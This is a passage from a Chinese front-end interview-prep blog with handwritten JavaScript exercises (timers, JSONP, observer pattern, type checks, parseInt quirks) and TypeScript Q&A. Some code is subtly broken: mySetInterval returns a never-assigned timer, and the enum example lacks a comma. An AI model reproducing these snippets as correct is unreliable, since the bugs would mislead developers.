setInterval？（1）"></a>使用 setTimeout 实现 setInterval？（1）</h2><p><strong>why？</strong></p><p>每个 setTimeout 产生的任务会直接 push 到任务队列中；而 setInterval 在每次把任务 push 到任务队列前，都要进行一下判断（看上次的任务是否仍在队列中，如果有则不添加）。</p><p>实现思路是<strong>使用递归函数，不断地去执行 setTimeout</strong> 从而达到 setInterval 的效果。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mySetInterval</span>(<span class="params">fn, timeout</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 控制器</span></span><br><span class="line">  <span class="keyword">let</span> timer</span><br><span class="line">  <span class="comment">// 设置递归函数，模拟定时器执行。</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">interval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      fn();</span><br><span class="line">      <span class="built_in">setTimeout</span>(interval, timeout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 启动定时器</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(interval, timeout);</span><br><span class="line">  <span class="comment">// 返回控制器</span></span><br><span class="line">  <span class="keyword">return</span> timer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用-async-await-setTimeout-手写定时器"><a href="#用-async-await-setTimeout-手写定时器" class="headerlink" title="用 async/await + setTimeout  手写定时器"></a>用 async/await + setTimeout  手写定时器</h2><h2 id="封装一个-javascript-的类型判断函数？"><a href="#封装一个-javascript-的类型判断函数？" class="headerlink" title="封装一个 javascript 的类型判断函数？"></a>封装一个 javascript 的类型判断函数？</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getType</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 判断数据是 null 的情况</span></span><br><span class="line">  <span class="keyword">if</span> (value === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> value + <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断数据是引用类型的情况</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> valueClass = <span class="built_in">Object</span>.prototype.toString.call(value),</span><br><span class="line">      type = valueClass.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    type.pop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> type.join(<span class="string">&quot;&quot;</span>).toLowerCase();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 判断数据是基本数据类型的情况和函数的情况</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手写一个-jsonp"><a href="#手写一个-jsonp" class="headerlink" title="手写一个 jsonp"></a>手写一个 jsonp</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">url, params, callback</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 判断是否含有参数</span></span><br><span class="line">  <span class="keyword">let</span> queryString = url.indexOf(<span class="string">&quot;?&quot;</span>) === -<span class="number">1</span> ? <span class="string">&quot;?&quot;</span> : <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加参数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> params) &#123;</span><br><span class="line">    <span class="keyword">if</span> (params.hasOwnProperty(k)) &#123;</span><br><span class="line">      queryString += k + <span class="string">&quot;=&quot;</span> + params[k] + <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理回调函数名</span></span><br><span class="line">  <span class="keyword">let</span> random = <span class="built_in">Math</span>.random()</span><br><span class="line">      .toString()</span><br><span class="line">      .replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">    callbackName = <span class="string">&quot;myJsonp&quot;</span> + random;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加回调函数</span></span><br><span class="line">  queryString += <span class="string">&quot;callback=&quot;</span> + callbackName;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构建请求</span></span><br><span class="line">  <span class="keyword">let</span> scriptNode = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  scriptNode.src = url + queryString;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>[callbackName] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 调用回调函数</span></span><br><span class="line">    callback(...arguments);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除这个引入的脚本</span></span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].removeChild(scriptNode);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 发起请求</span></span><br><span class="line">  <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].appendChild(scriptNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手写一个观察者模式？"><a href="#手写一个观察者模式？" class="headerlink" title="手写一个观察者模式？"></a>手写一个观察者模式？</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> events = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> topics = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// 注册监听函数</span></span><br><span class="line">    <span class="attr">subscribe</span>: <span class="function"><span class="keyword">function</span>(<span class="params">topic, handler</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!topics.hasOwnProperty(topic)) &#123;</span><br><span class="line">        topics[topic] = [];</span><br><span class="line">      &#125;</span><br><span class="line">      topics[topic].push(handler);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发布事件，触发观察者回调事件</span></span><br><span class="line">    <span class="attr">publish</span>: <span class="function"><span class="keyword">function</span>(<span class="params">topic, info</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (topics.hasOwnProperty(topic)) &#123;</span><br><span class="line">        topics[topic].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">handler</span>) </span>&#123;</span><br><span class="line">          handler(info);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除主题的一个观察者的回调事件</span></span><br><span class="line">    <span class="attr">remove</span>: <span class="function"><span class="keyword">function</span>(<span class="params">topic, handler</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!topics.hasOwnProperty(topic)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> handlerIndex = -<span class="number">1</span>;</span><br><span class="line">      topics[topic].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item === handler) &#123;</span><br><span class="line">          handlerIndex = index;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (handlerIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        topics[topic].splice(handlerIndex, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除主题的所有观察者的回调事件</span></span><br><span class="line">    <span class="attr">removeAll</span>: <span class="function"><span class="keyword">function</span>(<span class="params">topic</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (topics.hasOwnProperty(topic)) &#123;</span><br><span class="line">        topics[topic] = [];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="手写一个发布订阅模式（todo）"><a href="#手写一个发布订阅模式（todo）" class="headerlink" title="手写一个发布订阅模式（todo）"></a>手写一个发布订阅模式（todo）</h2><p><a href="https://juejin.cn/post/6844903850105634824">https://juejin.cn/post/6844903850105634824</a></p><h2 id="实现带并发限制的promise异步调用（todo）（▲▲）"><a href="#实现带并发限制的promise异步调用（todo）（▲▲）" class="headerlink" title="实现带并发限制的promise异步调用（todo）（▲▲）"></a>实现带并发限制的promise异步调用（todo）（▲▲）</h2><p><a href="https://cloud.tencent.com/developer/article/1661044">https://cloud.tencent.com/developer/article/1661044</a></p><h2 id="设计一个简单的链式调用，要求分别在1，3，4秒后打印出”1”-“2”-“3”-（todo）"><a href="#设计一个简单的链式调用，要求分别在1，3，4秒后打印出”1”-“2”-“3”-（todo）" class="headerlink" title="设计一个简单的链式调用，要求分别在1，3，4秒后打印出”1”, “2”, “3” （todo）"></a>设计一个简单的链式调用，要求分别在1，3，4秒后打印出”1”, “2”, “3” （todo）</h2><p><a href="https://juejin.cn/post/6844904200082554888#heading-10">https://juejin.cn/post/6844904200082554888#heading-10</a></p><h2 id="使用setTimeout每隔一秒输出一个元素，保证队列中一次只有一个事件"><a href="#使用setTimeout每隔一秒输出一个元素，保证队列中一次只有一个事件" class="headerlink" title="使用setTimeout每隔一秒输出一个元素，保证队列中一次只有一个事件"></a>使用setTimeout每隔一秒输出一个元素，保证队列中一次只有一个事件</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testAsync</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(i);</span><br><span class="line">          resolve();</span><br><span class="line">      &#125;,<span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">testAwait</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (num &lt; arr.length) &#123;</span><br><span class="line">      <span class="keyword">await</span> testAsync(arr[num]);</span><br><span class="line">      num++;</span><br><span class="line">      testAwait(arr);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">testAwait([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]);</span><br></pre></td></tr></table></figure><h1 id="JavaScript代码题"><a href="#JavaScript代码题" class="headerlink" title="JavaScript代码题"></a>JavaScript代码题</h1><h2 id="下面代码的结果？"><a href="#下面代码的结果？" class="headerlink" title="下面代码的结果？"></a>下面代码的结果？</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (x) &#123;</span><br><span class="line">  alert(<span class="string">&#x27;hi&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> y = <span class="built_in">Boolean</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (y) &#123;</span><br><span class="line">  alert(<span class="string">&#x27;hello&#x27;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>if(x) 这里期望 x 是一个布尔类型的原始值，而 x 是一个对象，<strong>任何对象转为布尔值，都为得到 true</strong>（切记！在 JS 中，只有 0，-0，NaN，””，null，undefined 这六个值转布尔值时，结果为 false）。</li></ul><h2 id="‘1’-’2’-’3’-map-parseInt-返回值？"><a href="#‘1’-’2’-’3’-map-parseInt-返回值？" class="headerlink" title="[‘1’,’2’,’3’].map(parseInt)返回值？"></a>[‘1’,’2’,’3’].map(parseInt)返回值？</h2><p>[1, NaN, NaN]。</p><p>parseInt() 函数能解析一个字符串，并返回一个整数，需要两个参数 (val, radix)，其中 radix 表示要解析的数字的基数。（该值介于 2 ~ 36 之间，并且字符串中的数字不能大于 radix 才能正确返回数字结果值）。当参数 <code>radix</code> 的值为 <code>0</code>，或没有设置该参数时，<code>parseInt()</code> 会根据 <code>string</code> 来判断数字的基数。</p><p>此处 map 传了 3 个参数 (element, index, array)，默认第三个参数被忽略掉，因此三次传入的参数分别为 “1-0”, “2-1”, “3-2”</p><ul><li>parseInt(‘1’, 0); // radix为0时，使用默认的10进制。</li><li>parseInt(‘2’, 1); // radix值在2-36，无法解析，返回NaN</li><li>parseInt(‘3’, 2); // 基数为2，2进制数表示的数中，最大值小于3，无法解析，返回NaN</li></ul><p>变成[1,2,3]：</p><ul><li>[“1”,”2”,”3”].map(Number)</li><li>[“1”,”2”,”3”].map(v =&gt; +v);</li></ul><h2 id="使用闭包实现每隔一秒打印-1-2-3-4"><a href="#使用闭包实现每隔一秒打印-1-2-3-4" class="headerlink" title="使用闭包实现每隔一秒打印 1,2,3,4"></a>使用闭包实现每隔一秒打印 1,2,3,4</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用闭包实现</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;, i * <span class="number">1000</span>);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 let 块级作用域</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;, i * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="100000长度的列表怎么删除一个元素？"><a href="#100000长度的列表怎么删除一个元素？" class="headerlink" title="100000长度的列表怎么删除一个元素？"></a>100000长度的列表怎么删除一个元素？</h2><p>答：splice，和末尾交换然后pop，往前平移然后pop末尾。</p><p>那么你觉得平移和splice哪个更高效？</p><h2 id="计算两个日期中间差的天数"><a href="#计算两个日期中间差的天数" class="headerlink" title="计算两个日期中间差的天数"></a>计算两个日期中间差的天数</h2><p>使用javascript的内置getTime()函数获取日期的内部毫秒值。使用前一个日期中减去后一个日期，获得以毫秒为单位的差。通过将两个日期的差（以毫秒为单位）除以一天中的毫秒数来计算最终结果。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算两个日期得天数 yyyy-mm-ddyyyy-mm-dd</span></span><br><span class="line">Tools.getDayDateBetween  =  <span class="function"><span class="keyword">function</span>(<span class="params">date1,date2</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> date1Obj = <span class="keyword">new</span> <span class="built_in">Date</span>(date1);</span><br><span class="line"><span class="keyword">var</span> date2Obj = <span class="keyword">new</span> <span class="built_in">Date</span>(date2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> t1 = date1Obj.getTime();</span><br><span class="line"><span class="keyword">var</span> t2 = date2Obj.getTime();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dateTime = <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>;</span><br><span class="line"><span class="keyword">var</span> minusDays = <span class="built_in">Math</span>.floor((t2 - t1)/dateTime);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Math</span>.abs(minusDays);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="JS-原型链题（to-understand）"><a href="#JS-原型链题（to-understand）" class="headerlink" title="JS 原型链题（to understand）"></a>JS 原型链题（to understand）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">Foo.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">2</span>);</span><br><span class="line">&#125;;</span><br><span class="line">Foo.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">3</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">4</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//请写出以下输出结果：</span></span><br><span class="line">Foo.getName(); <span class="comment">// 2</span></span><br><span class="line">getName(); <span class="comment">// 4</span></span><br><span class="line">Foo().getName(); <span class="comment">// 1</span></span><br><span class="line">getName(); <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">new</span> Foo.getName(); <span class="comment">// 2</span></span><br><span class="line"><span class="keyword">new</span> Foo().getName(); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">new</span> <span class="keyword">new</span> Foo().getName(); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h2 id="将浮点数点左边的数每三位添加一个逗号，如-12000000-11-转化为12-000-000-11"><a href="#将浮点数点左边的数每三位添加一个逗号，如-12000000-11-转化为12-000-000-11" class="headerlink" title="*将浮点数点左边的数每三位添加一个逗号，如 12000000.11 转化为12,000,000.11?"></a>*将浮点数点左边的数每三位添加一个逗号，如 12000000.11 转化为12,000,000.11?</h2><ul><li><p>replace是字符串方法，需要先toString()</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">number</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> number &amp;&amp; number.toString().replace(<span class="regexp">/(?!^)(?=(\d&#123;3&#125;)+\.)/g</span>, <span class="string">&quot;,&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Intl</code> 对象是 ECMAScript 国际化 API 的一个命名空间，它提供了精确的字符串对比。<code>Intl.NumberFormat</code>用于启用语言敏感数字格式的对象的构造函数。NumberFormat()为空就默认英美地区数字表达方式。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format1</span>(<span class="params">number</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Intl</span>.NumberFormat().format(number)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>toLocaleString()</code> 方法返回该对象的字符串，字符串格式因不同语言而不同。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format2</span>(<span class="params">number</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> number.toLocaleString(<span class="string">&#x27;en&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用-JS-获取文件扩展名？"><a href="#使用-JS-获取文件扩展名？" class="headerlink" title="*使用 JS 获取文件扩展名？"></a>*使用 JS 获取文件扩展名？</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// String.lastIndexOf() 方法返回指定值（本例中的&#x27;.&#x27;）在调用该方法的字符串中最后出现的位置，如果没找到则返回 -1。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于 &#x27;filename&#x27; 和 &#x27;.hiddenfile&#x27; ，lastIndexOf 的返回值分别为 0 和 -1 无符号右移操作符(&gt;&gt;&gt;) 将 -1 转换为 4294967295 ，将 -2 转换为 4294967294 ，这个方法可以保证边缘情况时文件名不变。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// String.prototype.slice() 从上面计算的索引处提取文件的扩展名。如果索引比文件名的长度大，结果为&quot;&quot;。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFileExtension</span>(<span class="params">filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> filename.slice(((filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">0</span>) + <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何判断一个对象是否为空对象？"><a href="#如何判断一个对象是否为空对象？" class="headerlink" title="*如何判断一个对象是否为空对象？"></a>*如何判断一个对象是否为空对象？</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNullObj</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.keys(obj).length === <span class="number">0</span> &amp;&amp; <span class="built_in">Object</span>.getOwnPropertySymbols(obj).length === <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何查找一篇英文文章中出现频率最高的单词？"><a href="#如何查找一篇英文文章中出现频率最高的单词？" class="headerlink" title="*如何查找一篇英文文章中出现频率最高的单词？"></a>*如何查找一篇英文文章中出现频率最高的单词？</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMostWord</span>(<span class="params">article</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 合法性判断</span></span><br><span class="line">  <span class="keyword">if</span> (!article) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 参数处理</span></span><br><span class="line">  article = article.trim().toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> wordList = article.match(<span class="regexp">/[a-z]+/g</span>),</span><br><span class="line">    visited = [],</span><br><span class="line">    maxNum = <span class="number">0</span>,</span><br><span class="line">    maxWord = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  article = <span class="string">&quot; &quot;</span> + wordList.join(<span class="string">&quot;  &quot;</span>) + <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历判断单词出现次数</span></span><br><span class="line">  wordList.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (visited.indexOf(item) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加入 visited </span></span><br><span class="line">      visited.push(item);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> word = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot; &quot;</span> + item + <span class="string">&quot; &quot;</span>, <span class="string">&quot;g&quot;</span>),</span><br><span class="line">        num = article.match(word).length;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (num &gt; maxNum) &#123;</span><br><span class="line">        maxNum = num;</span><br><span class="line">        maxWord = item;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> maxWord + <span class="string">&quot;  &quot;</span> + maxNum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何将字符串转化为数字，例如-‘12-3b’"><a href="#如何将字符串转化为数字，例如-‘12-3b’" class="headerlink" title="*如何将字符串转化为数字，例如 ‘12.3b’?"></a>*如何将字符串转化为数字，例如 ‘12.3b’?</h2><p>（1）使用 Number() 方法，前提是所包含的字符串不包含不合法字符。</p><p>（2）使用 parseInt() 方法，parseInt() 函数可解析一个字符串，并返回一个整数。还可以设置要解析的数字的基数。当基数的值为 0，或没有设置该参数时，parseInt() 会根据 string 来判断数字的基数。</p><p>（3）使用 parseFloat() 方法，该函数解析一个字符串参数并返回一个浮点数。</p><p>（4）使用 + 操作符的隐式转换，前提是所包含的字符串不包含不合法字符。</p><h2 id="大数相加"><a href="#大数相加" class="headerlink" title="*大数相加"></a>*大数相加</h2><p>参考自<a href="https://zhuanlan.zhihu.com/p/72179476">JS 实现两个大数相加？</a>。</p><h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><h2 id="Typescript-优缺点？（高频）"><a href="#Typescript-优缺点？（高频）" class="headerlink" title="Typescript 优缺点？（高频）"></a>Typescript 优缺点？（高频）</h2><p>Typescript 是一个强类型的 JavaScript 超集，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。</p><p>优点：</p><ul><li><strong>增强了代码的可读性和可维护性</strong>，强类型的系统相当于最好的文档，在编译时即可发现大部分的错误，增强编辑器的功能。</li><li><strong>包容性</strong>，js 文件可以直接改成 ts 文件，不定义类型可自动推论类型。ts编译报错也可以生成 js 文件，兼容第三方库，即使不是 ts 编写的。</li><li><strong>支持 ES6 语法</strong>，提供了 ES6 所有优点和更高的生产力。</li><li>社区活跃，大多数的第三方库都可提供给 ts 的类型定义文件，完全支持es6</li></ul><p>缺点：</p><ul><li>增加学习成本，需要理解接口（Interfaces）和泛型（Generics），类（class），枚举类型（Enums）。</li><li>增加开发成本，因为增加了类型定义</li><li>需要编译，类型检查会增加编译时长，语法和类型系统复杂的话时间特别长</li><li>ts 集成到构建流程需要一定的工作量</li><li>和有些库结合时不是很完美</li></ul><h2 id="讲讲你理解的-ts-泛型（高频）"><a href="#讲讲你理解的-ts-泛型（高频）" class="headerlink" title="讲讲你理解的 ts 泛型（高频）"></a>讲讲你理解的 ts 泛型（高频）</h2><p><a href="https://lucifer.ren/blog/2020/06/16/ts-generics/">https://lucifer.ren/blog/2020/06/16/ts-generics/</a></p><p>TypeScript 泛型：是一个提供创建可重用组件方法的工具。它能够<strong>创建可以处理多种数据类型的组件</strong>。提供类型安全性，允许创建泛型类、泛型函数、泛型方法和泛型接口。（对类进行编程）</p><p>在泛型中，类型参数写在开(&lt;)和闭(&gt;)括号之间，这使得它是强类型集合。</p><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;      </span><br><span class="line">    <span class="keyword">return</span> arg;      </span><br><span class="line">&#125;      </span><br><span class="line"><span class="keyword">let</span> output1 = identity&lt;<span class="built_in">string</span>&gt;(<span class="string">&quot;myString&quot;</span>);      </span><br><span class="line"><span class="keyword">let</span> output2 = identity&lt;<span class="built_in">number</span>&gt;( <span class="number">100</span> );    </span><br><span class="line"><span class="built_in">console</span>.log(output1);    </span><br><span class="line"><span class="built_in">console</span>.log(output2);     </span><br></pre></td></tr></table></figure><h3 id="泛型主要为了解决什么问题"><a href="#泛型主要为了解决什么问题" class="headerlink" title="泛型主要为了解决什么问题"></a>泛型主要为了解决什么问题</h3><p>当函数，接口或者类：</p><ul><li>需要作用到很多类型的时候。</li><li>需要被用到很多地方的时候。</li></ul><h2 id="enum-实现原理"><a href="#enum-实现原理" class="headerlink" title="enum 实现原理"></a>enum 实现原理</h2><p>enum 枚举是一种数据类型，允许我们定义一组命名常量。使用枚举可以更容易地记录意图，或者创建一组不同的案例。它是相关值的集合，可以是数值或字符串值。</p><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="built_in">enum</span> Gender &#123;  </span><br><span class="line">  Male,  </span><br><span class="line">  Female  </span><br><span class="line">  Other  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">console</span>.log(Gender.Female); <span class="comment">// : 1  </span></span><br><span class="line"><span class="comment">// 还可以通过enum值的number值来访问它</span></span><br><span class="line"><span class="built_in">console</span>.log(Gender[<span class="number">1</span>]); <span class="comment">// : Female  </span></span><br></pre></td></tr></table></figure><h2 id="列举-Typescript-工具类型-todo"><a href="#列举-Typescript-工具类型-todo" class="headerlink" title="列举 Typescript 工具类型(todo)"></a>列举 Typescript 工具类型(todo)</h2><p><a href="https://www.cnblogs.com/frank-link/p/14781056.html">https://www.cnblogs.com/frank-link/p/14781056.html</a></p><h2 id="type-和-interface-的区别以及使用场景"><a href="#type-和-interface-的区别以及使用场景" class="headerlink" title="type 和 interface 的区别以及使用场景"></a>type 和 interface 的区别以及使用场景</h2><figure class="highlight ts"><table><tr><td 